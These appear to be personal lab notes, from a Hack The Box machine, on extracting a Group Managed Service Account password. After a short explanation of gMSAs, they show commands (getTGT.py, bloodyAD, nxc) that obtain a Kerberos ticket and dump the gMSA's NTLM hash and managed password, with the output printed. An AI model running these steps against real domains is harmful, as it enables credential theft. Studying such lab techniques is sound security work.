
Group Managed Service Accounts (gMSAs) in Windows are special service accounts that enhance security and simplify management in Active Directory environments. They automatically handle password updates, ensuring complex and regularly changing passwords without manual intervention. gMSAs also manage Service Principal Names (SPNs) and can be used across multiple servers within the same domain, allowing services to securely share a common account. By reducing administrative tasks and minimizing the risk of credential theft, gMSAs offer an effective solution for managing service account credentials.

![[Pasted image 20241204125650.png]]

```bash
garffff@garffff:~$ nxc ldap 10.129.121.239 -u 'fs01$' -p 'fs01' -k --gmsa
LDAP        10.129.121.239  389    10.129.121.239   [-] LDAPs connection to ldaps://10.129.121.239 failed - (104, 'ECONNRESET')
LDAP        10.129.121.239  389    10.129.121.239   [-] Even if the port is open, LDAPS may not be configured
```

Should the above error happen, do the following:

```bash
garffff@garffff:~$ getTGT.py 'vintage.htb/fs01$:fs01'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in fs01$.ccache

garffff@garffff:~$ export KRB5CCNAME=fs01.ccache 
garffff@garffff:~$ klist
Ticket cache: FILE:fs01.ccache
Default principal: fs01$@VINTAGE.HTB

Valid starting     Expires            Service principal
04/12/24 12:49:42  04/12/24 22:49:42  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 05/12/24 12:49:42

garffff@garffff:~$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.129.199.135 -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
```